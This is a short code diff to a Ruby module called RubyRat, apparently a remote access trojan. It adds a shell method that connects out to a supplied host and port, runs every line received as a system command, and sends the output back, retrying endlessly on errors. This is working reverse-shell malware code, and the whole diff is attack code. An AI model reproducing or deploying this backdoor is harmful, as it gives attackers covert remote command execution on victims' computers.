@@ -6,6 +6,7 @@
 require 'etc'
 require 'core'
 require 'net/http'
+require 'open3'
 
 module RubyRat
   module Tools
@@ -105,6 +106,21 @@ module RubyRat
     def self.ifconfig(plat)
       return `ifconfig` if plat != 'win'
       `ipconfig /all`
+    end
+
+    def self.shell(host, port)
+      sleep(1.5) # prevent weird timing issue
+      sock = TCPSocket.new host, port
+
+      begin
+        while line = sock.gets
+          Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
+            IO.copy_stream(stdout_and_stderr, sock)
+          end
+        end
+      rescue
+        retry
+      end
     end
 
   end
